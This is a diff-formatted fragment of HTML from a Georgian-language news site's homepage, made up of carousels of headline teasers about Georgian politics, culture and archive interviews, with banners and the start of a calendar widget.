+              <div class="img_wrap"><a href="inside.php?menuid=101&amp;id=208480" style="cursor:pointer;"><img src="uploads/news_208480.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=101&amp;id=208480" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              ზაალ ანჯაფარიძე: თამარ ჩერგოლეიშვილი რომ დაუწყებს ქართველ საზოგად...</a>
+              <span class="big_news_date" style="font-size:12px">22 მაისი. 2023.  13:54</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=101&amp;id=208478" style="cursor:pointer;"><img src="uploads/news_208478.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=101&amp;id=208478" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              გია აბაშიძე: პოლიტიკურად დაპირისპირებულთა ოჯახებსა და შვილებს რომ...</a>
+              <span class="big_news_date" style="font-size:12px">22 მაისი. 2023.  13:07</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=101&amp;id=208474" style="cursor:pointer;"><img src="uploads/news_208474.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=101&amp;id=208474" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              გიორგი ცუცქირიძე: მსოფლიო ბანკის მონაცემებით, საქართველოში უმუშევ...</a>
+              <span class="big_news_date" style="font-size:12px">22 მაისი. 2023.  12:25</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=101&amp;id=208472" style="cursor:pointer;"><img src="uploads/news_208472.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=101&amp;id=208472" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              დავით ქართველიშვილი: „სოხუმი და ცხინვალი - „რუსული პროექტი!“ - და...</a>
+              <span class="big_news_date" style="font-size:12px">22 მაისი. 2023.  11:42</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 4px">
+                  
+              <div class="img_wrap"><a href="inside.php?menuid=101&amp;id=208470" style="cursor:pointer;"><img src="uploads/news_208470.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=101&amp;id=208470" style="color:inherit;height:56px;overflow:hidden;display:block;">
+                
+                      
+              ნანა კაკაბაძე: ნაცვლად იმისა, რომ თვითონაც გვიწესებდეს უვიზო რეჟი...</a>
+              <span class="big_news_date" style="font-size:12px">22 მაისი. 2023.  10:02</span>
+              
+            </li>
+    
+               
+    
+       
+    
+          </ul>
+    
+          <ul class="carousel_pages">
+    
+                <li class="prev" style="margin-left:-5px;" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_prv.png?w=6&amp;h=9" width="6" height="9" alt="prv" style="padding:1px 3px;">
+    </a></li>
+    
+                <li class="next" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_nxt.png?w=6&amp;h=9" width="6" height="9" alt="sld_nxt" style="padding:1px 3px;">
+    </a></li>
+    
+              </ul>
+    
+          <a class="archive" href="index.php?menuid=101">არქივი</a> 
+          </div>
+    
+        </div>
+    
+        <div class="four_news_wrap" style="margin-top:21px; padding: 0px 3px; width: 344px;"> <a href="index.php?menuid=67"><span class="category_mark left_sider" style="transform:none;right:61.3%;top:-22px;">ეს საინტერესოა</span></a>
+    
+      <div class="jcarousel" style="margin-bottom:0px;" data-jcarousel="true">
+    
+          <ul class="news_block" style="height: 199px; left: 0px; top: 0px;">
+    
+               
+    
+            <li style="margin-right: 3px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" href="inside.php?menuid=67&amp;id=178030"><img src="uploads/news_178030.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=67&amp;id=178030" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              SpaceX-მა ორბიტაზე უკრაინული თანამგზავრი გაიყვანა...</a>
+              <span class="big_news_date" style="font-size:12px">14 იანვარი. 2022.  02:24</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 3px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" href="inside.php?menuid=67&amp;id=177422"><img src="uploads/news_177422.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=67&amp;id=177422" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              ახალი წელი საქართველოს კუთხეებში...</a>
+              <span class="big_news_date" style="font-size:12px">1 იანვარი. 2022.  00:17</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 3px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" href="inside.php?menuid=67&amp;id=177421"><img src="uploads/news_177421.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=67&amp;id=177421" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                <span class="photo_mark"></span>
+                      
+              ახალი წელი და ქართული ფოლკლორი...</a>
+              <span class="big_news_date" style="font-size:12px">1 იანვარი. 2022.  00:01</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 3px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" href="inside.php?menuid=67&amp;id=176779"><img src="uploads/news_176779.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=67&amp;id=176779" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              სრულიად საქართველოს კათოლიკოს-პატრიარქის უწმიდესი და უნეტარესი კა...</a>
+              <span class="big_news_date" style="font-size:12px">23 დეკემბერი. 2021.  13:38</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 3px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" href="inside.php?menuid=67&amp;id=145611"><img src="uploads/news_145611.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=67&amp;id=145611" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                <span class="photo_mark"></span>
+                      
+              რა დატვირთვა აქვს მზითვს?...</a>
+              <span class="big_news_date" style="font-size:12px">27 იანვარი. 2021.  13:58</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 3px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" href="inside.php?menuid=67&amp;id=143545"><img src="uploads/news_143545.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=67&amp;id=143545" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              აკრძალული ნაძვის ხე და გაუქმებული ახალი წელი - როგორ წაართვეს დღე...</a>
+              <span class="big_news_date" style="font-size:12px">2 იანვარი. 2021.  23:32</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 3px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" href="inside.php?menuid=67&amp;id=143505"><img src="uploads/news_143505.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=67&amp;id=143505" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              10 საინტერესო ფაქტი შობა-ახალი წლის შესახებ...</a>
+              <span class="big_news_date" style="font-size:12px">1 იანვარი. 2021.  18:30</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 3px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" href="inside.php?menuid=67&amp;id=143019"><img src="uploads/news_143019.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=67&amp;id=143019" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              5 რამ, რაც საახალწლო სუფრაზე აუცილებლად უნდა გქონდეთ - ცაგარელის ...</a>
+              <span class="big_news_date" style="font-size:12px">26 დეკემბერი. 2020.  21:14</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 3px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" href="inside.php?menuid=67&amp;id=134518"><img src="uploads/news_134518.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=67&amp;id=134518" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              ნორვეგიაში თორისა და ოდინის უძველესი ტაძარი აღმოაჩინეს...</a>
+              <span class="big_news_date" style="font-size:12px">12 ოქტომბერი. 2020.  13:38</span>
+              
+            </li>
+    
+                
+    
+            <li style="margin-right: 3px">
+                  
+              <div class="img_wrap"><a style="cursor:pointer;" href="inside.php?menuid=67&amp;id=134432"><img src="uploads/news_134432.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a></div>
+    
+              <a href="inside.php?menuid=67&amp;id=134432" style="color:inherit;height:56px;overflow:hidden;display:block;cursor:pointer;">
+                
+                      
+              „არავის უნდოდა ჩემთან ერთად მოგზაურობა, ამიტომ წავედი სრულიად უცნ...</a>
+              <span class="big_news_date" style="font-size:12px">11 ოქტომბერი. 2020.  14:55</span>
+              
+            </li>
+    
+               
+    
+       
+    
+          </ul>
+    
+          <ul class="carousel_pages">
+    
+                <li class="prev" style="margin-left:-5px;" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_prv.png?w=6&amp;h=9" width="6" height="9" alt="prv" style="padding:1px 3px;">
+    </a></li>
+    
+                <li class="next" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_nxt.png?w=6&amp;h=9" width="6" height="9" alt="sld_nxt" style="padding:1px 3px;">
+    </a></li>
+    
+              </ul>
+    
+          <a class="archive" href="index.php?menuid=67">არქივი</a> 
+          </div>
+    
+        </div>
+    
+       
+    
+    
+         
+    
+       
+    
+            <div class="news_block_wrap" style="width:352px;float: left;margin-top: 21px;"> <a href="index.php?menuid=24"><span class="category_mark left_sider" style="transform:none;right:67.5%;top:-22px;">პრეს - კლუბი</span></a>
+    
+        <div class="jcarousel" style="width:352px;margin-bottom: 6px;" data-jcarousel="true">
+    
+              <ul class="news_block" style="left: 0px; top: 0px;">
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-55308">
+                  
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('EqlGeaiF_LQ');"><img src="uploads/news_55308.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                    
+                    <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('EqlGeaiF_LQ');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-55308">დათო ლორთქიფანიძის პრესკონფერენცია ...</span>
+                  <!--<span id="big_title-55308" class="hover">დათო ლორთქიფანიძის პრესკონფერენცია ...</span>-->
+                  <div class="rep_tvalit_date">13 ოქტომბერი, 2017,  14:07</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-55211">
+                  
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('WPhMwzxkH8w');"><img src="uploads/news_55211.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                    
+                    
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('WPhMwzxkH8w');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-55211">გიორგი ვოლსკის პრესკონფერენცია ...</span>
+                  <!--<span id="big_title-55211" class="hover">გიორგი ვოლსკის პრესკონფერენცია ...</span>-->
+                  <div class="rep_tvalit_date">13 ოქტომბერი, 2017,  14:09</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-55135">
+                  
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('V580qzlo8nk');"><img src="uploads/news_55135.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                    
+                    <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('V580qzlo8nk');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-55135">იმედა ხუციშვილის პრესკონფერენცია ...</span>
+                  <!--<span id="big_title-55135" class="hover">იმედა ხუციშვილის პრესკონფერენცია ...</span>-->
+                  <div class="rep_tvalit_date">13 ოქტომბერი, 2017,  15:15</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-55134">
+                  
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('51t_hOJl3KU');"><img src="uploads/news_55134.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                    
+                    <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('51t_hOJl3KU');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-55134">გოგა ხაინდრავას პრესკონფერენცია ...</span>
+                  <!--<span id="big_title-55134" class="hover">გოგა ხაინდრავას პრესკონფერენცია ...</span>-->
+                  <div class="rep_tvalit_date">13 ოქტომბერი, 2017,  15:14</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-54585">
+                  
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('qTc2kFTSjgE');"><img src="uploads/news_54585.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                    
+                    <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('qTc2kFTSjgE');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-54585">იმედა ხუციშვილის პრესკონფერენცია...</span>
+                  <!--<span id="big_title-54585" class="hover">იმედა ხუციშვილის პრესკონფერენცია...</span>-->
+                  <div class="rep_tvalit_date">13 ოქტომბერი, 2017,  13:27</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-53155">
+                  
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('qVcMs6x-9s4');"><img src="uploads/news_53155.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                    
+                    <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('qVcMs6x-9s4');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-53155">დავით ოქიტაშვილის და შალვა ხაჭაპურიძის პრესკონფერენცია ...</span>
+                  <!--<span id="big_title-53155" class="hover">დავით ოქიტაშვილის და შალვა ხაჭაპურიძის პრესკონფერენცია ...</span>-->
+                  <div class="rep_tvalit_date">13 ოქტომბერი, 2017,  16:49</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-52760">
+                  
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('luJeBlBmBbE');"><img src="uploads/news_52760.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                    
+                    
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('luJeBlBmBbE');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-52760">შალვა ხაჭაპურიძის და ხათუნა ხოფერიას პრესკონფერენცია ...</span>
+                  <!--<span id="big_title-52760" class="hover">შალვა ხაჭაპურიძის და ხათუნა ხოფერიას პრესკონფერენცია ...</span>-->
+                  <div class="rep_tvalit_date">13 ოქტომბერი, 2017,  18:07</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-52504">
+                  
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('ADvay3RV2vI');"><img src="uploads/news_52504.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                    
+                    <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('ADvay3RV2vI');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-52504">დავით ოქიტაშვილის პრესკონფერენცია...</span>
+                  <!--<span id="big_title-52504" class="hover">დავით ოქიტაშვილის პრესკონფერენცია...</span>-->
+                  <div class="rep_tvalit_date">13 ოქტომბერი, 2017,  13:10</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-52464">
+                  
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('_ltvz7x_5FE');"><img src="uploads/news_52464.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                    
+                    
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('_ltvz7x_5FE');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-52464">მაკა ჩიქოვანის პრესკონფერენცია ...</span>
+                  <!--<span id="big_title-52464" class="hover">მაკა ჩიქოვანის პრესკონფერენცია ...</span>-->
+                  <div class="rep_tvalit_date">13 ოქტომბერი, 2017,  15:30</div></a>
+               </li>
+               
+    
+              
+                <li style="margin-top:0" class="news_background" id="mainnews-50521">
+                  
+                  <div class="img_wrap" style="margin-bottom:0px; cursor:pointer;"><a onclick="video('dpheXtiop1A');"><img src="uploads/news_50521.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                    
+                    <span class="video_mark" style="top:5px"></span>
+                  </div>
+    
+                  <a class="rolling_info_news" onclick="video('dpheXtiop1A');" style="color:inherit;cursor:pointer;">
+                  <span id="small_title-50521">ნიკოლოზ პატარქალიშვილის პრესკონფერენცია...</span>
+                  <!--<span id="big_title-50521" class="hover">ნიკოლოზ პატარქალიშვილის პრესკონფერენცია...</span>-->
+                  <div class="rep_tvalit_date">13 ოქტომბერი, 2017,  20:00</div></a>
+               </li>
+               
+    
+                
+    
+    
+    
+              </ul>
+    
+          <script type="text/javascript">
+                  /*$(document).ready(function(){
+                    var id=$('.news_background').attr('id')[0];
+                      $("#"+id).mouseover(function(){
+                      alert(id);
+        
+                  })
+                  });*/
+               </script>
+    
+              <ul class="carousel_pages" style="margin-bottom: 0px">
+    
+                <li class="prev" style="margin-left:-8px;" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_prv.png?w=6&amp;h=9" width="6" height="9" alt="prv" style="padding:1px 3px;">
+    </a></li>
+    
+                <li class="next" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_nxt.png?w=6&amp;h=9" width="6" height="9" alt="sld_nxt" style="padding:1px 3px;">
+    </a></li>
+    
+              </ul>
+    
+              <a class="archive" href="index.php?menuid=24" style="margin:-18px 4px 0 0;">არქივი</a> </div>
+    
+          </div>
+    
+            <div class="news_block_wrap" style="width:352px;margin-top:21px;float: right;"> <a href="index.php?menuid=33"><span class="category_mark left_sider" style="transform:none;right:69%;top:-22px;"> "არქივიდან" </span></a>
+    
+        <div class="jcarousel" style="width:352px;margin-bottom: 6px;" data-jcarousel="true">
+    
+              <ul class="news_block" style="left: 0px; top: 0px;">
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                
+                    <a style="cursor:pointer;" onclick="video('');"><img src="uploads/news_183972.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      
+                  </div>
+                  <a class="rolling_info_news" href="inside.php?menuid=33&amp;id=183972" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">მიხეილ სააკაშვილი რუსეთთან უვიზო მიმოსვლის შემოღების შესახებ...</span>
+                  <!--<span id="big_title" class="hover">მიხეილ სააკაშვილი რუსეთთან უვიზო მიმოსვლის შემოღების შესახებ...</span>-->
+                  <div class="rep_tvalit_date">26 მარტი, 2022,  23:20</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                
+                    <a style="cursor:pointer;" onclick="video('');"><img src="uploads/news_174722.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      
+                  </div>
+                  <a class="rolling_info_news" href="inside.php?menuid=33&amp;id=174722" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">კობა დავითაშვილი 7 ნოემბრის ტრაგიკულ ამბავზე!...</span>
+                  <!--<span id="big_title" class="hover">კობა დავითაშვილი 7 ნოემბრის ტრაგიკულ ამბავზე!...</span>-->
+                  <div class="rep_tvalit_date">26 მარტი, 2022,  13:34</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                
+                    <a style="cursor:pointer;" onclick="video('');"><img src="uploads/news_174045.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      <span class="video_mark" style="top:5px"></span>
+                  </div>
+                  <a class="rolling_info_news" href="inside.php?menuid=33&amp;id=174045" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">ცოტნე გამსახურდია: სააკაშვილი პროფესიონალი აფერისტია, განვითარებულ ქვე...</span>
+                  <!--<span id="big_title" class="hover">ცოტნე გამსახურდია: სააკაშვილი პროფესიონალი აფერისტია, განვითარებულ ქვეყანაში, მას სოფლის გამგებლად ა...</span>-->
+                  <div class="rep_tvalit_date">26 მარტი, 2022,  00:17</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                
+                    <a style="cursor:pointer;" onclick="video('');"><img src="uploads/news_173958.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      
+                  </div>
+                  <a class="rolling_info_news" href="inside.php?menuid=33&amp;id=173958" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">კობა დავითაშვილი: სააკაშვილი უნდა ჩაჯდეს პირველ რიგში და გვერდზე უნდა ...</span>
+                  <!--<span id="big_title" class="hover">კობა დავითაშვილი: სააკაშვილი უნდა ჩაჯდეს პირველ რიგში და გვერდზე უნდა მიუსხდნენ ბოკერია, მერაბიშვილი...</span>-->
+                  <div class="rep_tvalit_date">26 მარტი, 2022,  02:53</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                
+                    <a style="cursor:pointer;" onclick="video('');"><img src="uploads/news_173957.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      
+                  </div>
+                  <a class="rolling_info_news" href="inside.php?menuid=33&amp;id=173957" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">ლევან ბერძენიშვილი სააკაშვილზე: სრულად ქართული ანბანის 33 ასოც კი არ ი...</span>
+                  <!--<span id="big_title" class="hover">ლევან ბერძენიშვილი სააკაშვილზე: სრულად ქართული ანბანის 33 ასოც კი არ იცის...</span>-->
+                  <div class="rep_tvalit_date">26 მარტი, 2022,  02:53</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                
+                    <a style="cursor:pointer;" onclick="video('');"><img src="uploads/news_173840.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      
+                  </div>
+                  <a class="rolling_info_news" href="inside.php?menuid=33&amp;id=173840" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">ზურაბ ჯაფარიძე: პატიმრებს რომ აწამებდნენ მე ვიცოდი და ჩემს გარშემო ყვე...</span>
+                  <!--<span id="big_title" class="hover">ზურაბ ჯაფარიძე: პატიმრებს რომ აწამებდნენ მე ვიცოდი და ჩემს გარშემო ყველამ!...</span>-->
+                  <div class="rep_tvalit_date">26 მარტი, 2022,  00:18</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                
+                    <a style="cursor:pointer;" onclick="video('');"><img src="uploads/news_172978.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      
+                  </div>
+                  <a class="rolling_info_news" href="inside.php?menuid=33&amp;id=172978" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">ირაკლი წერეთელი: შოთა გორგოძე ბევრად ჯობდა შევარდნაძის დროიდან ყველა ს...</span>
+                  <!--<span id="big_title" class="hover">ირაკლი წერეთელი: შოთა გორგოძე ბევრად ჯობდა შევარდნაძის დროიდან ყველა სხვა შს მინისტრს...</span>-->
+                  <div class="rep_tvalit_date">26 მარტი, 2022,  19:46</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                
+                    <a style="cursor:pointer;" onclick="video('duE7-QFsAWg');"><img src="uploads/news_171515.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      <span class="video_mark" style="top:5px"></span>
+                  </div>
+                  <a class="rolling_info_news" href="inside.php?menuid=33&amp;id=171515" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">მიხეილ სააკაშვილი: მე გავეცი აფრასიძეების განადგურების ბრძანება და ამა...</span>
+                  <!--<span id="big_title" class="hover">მიხეილ სააკაშვილი: მე გავეცი აფრასიძეების განადგურების ბრძანება და ამას ერთი წამით არ ვნანობ!...</span>-->
+                  <div class="rep_tvalit_date">26 მარტი, 2022,  15:48</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                
+                    <a style="cursor:pointer;" onclick="video('Pxdh-RA_svI');"><img src="uploads/news_170313.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      <span class="video_mark" style="top:5px"></span>
+                  </div>
+                  <a class="rolling_info_news" href="inside.php?menuid=33&amp;id=170313" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">მერაბ კოსტავას დაკრძალვა - ზაზა გაბედავას გადაღებული კადრები...</span>
+                  <!--<span id="big_title" class="hover">მერაბ კოსტავას დაკრძალვა - ზაზა გაბედავას გადაღებული კადრები...</span>-->
+                  <div class="rep_tvalit_date">26 მარტი, 2022,  19:02</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                <li style="margin-top:0px" class="news_background">
+    
+                  <div class="img_wrap" style="margin-bottom:0px;">
+                
+                    <a style="cursor:pointer;" onclick="video('');"><img src="uploads/news_170154.jpg?w=170&amp;h=113" width="170" height="113" alt="newssampl">
+    </a>
+    
+                      
+                      
+                  </div>
+                  <a class="rolling_info_news" href="inside.php?menuid=33&amp;id=170154" style="color:inherit; cursor:pointer;">
+                  <span id="small_title">მიხეილ სააკაშვილი გამსახურდიაზე: ის ტირანია, რომელიც სადამ ჰუსეინს ჰგა...</span>
+                  <!--<span id="big_title" class="hover">მიხეილ სააკაშვილი გამსახურდიაზე: ის ტირანია, რომელიც სადამ ჰუსეინს ჰგავს ...</span>-->
+                  <div class="rep_tvalit_date">26 მარტი, 2022,  02:46</div>
+                  </a>
+    
+                </li>
+    
+                
+    
+                
+    
+              </ul>
+    
+               <ul class="carousel_pages" style="margin-bottom: 0px;">
+    
+                <li class="prev" style="margin-left:-8px;" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_prv.png?w=6&amp;h=9" width="6" height="9" alt="prv" style="padding:1px 3px;">
+    </a></li>
+    
+                <li class="next" data-jcarouselcontrol="true"><a href="#"><img src="images/sld_nxt.png?w=6&amp;h=9" width="6" height="9" alt="sld_nxt" style="padding:1px 3px;">
+    </a></li>
+    
+              </ul>
+    
+              <a class="archive" href="index.php?menuid=33" style="margin:-18px 4px 0 0;">არქივი</a> </div>
+    
+          </div>
+    
+        
+    
+    
+      
+    
+      
+        
+          
+    
+            
+    
+        
+    
+          
+        <ul class="big_banners" style="margin-top:8px">
+    
+          <li><a href="" target="_blank"><img src="uploads/banner_80.png?w=351&amp;h=104" width="351" height="104" alt="big_banner">
+    </a></li>
+    
+          <li><a href="https://www.allart.ge/" target="_blank"><img src="uploads/banner_161.jpg?w=351&amp;h=104" width="351" height="104" alt="big_banner">
+    </a></li>
+    
+    
+    
+        </ul>
+    
+        </div>
+    
+    
+    
+        <div class="right_wing">
+                    <!-- <div class="highlite_news" style="margin-top:3px;font-family:nino; background: #d6d6d6;"> 
+            <img src="images/tv_live.png">
+          </div>-->
+    
+           
+    
+           
+    
+    
+        <div class="four_news_wrap" style="width:292px;margin-top:20px; padding:0 3px;"> <span class="category_mark left_sider" style="transform:none;right: 33%;top:-21px;">სიახლეები თარიღებით</span>
+    
+    
+            
+            <div class="rightbar_other" style="font-size:12px; color:#3a3a3a;height: 179px;padding-left: 25px;">
+                <div id="calendar" align="center"><table class="cal_bottom" border="0" cellpadding="0" cellspacing="0">
+    <tbody><tr>
+    <td width="24" align="center" valign="middle"><a onclick="cal(5,2022,1)"><img src="img/calPrevYear.png" alt=""></a></td>
+    <td width="8" align="center" valign="middle"><a onclick="cal(4,2023,1)"><img src="img/calPrevMonth.png" alt=""></a></td>
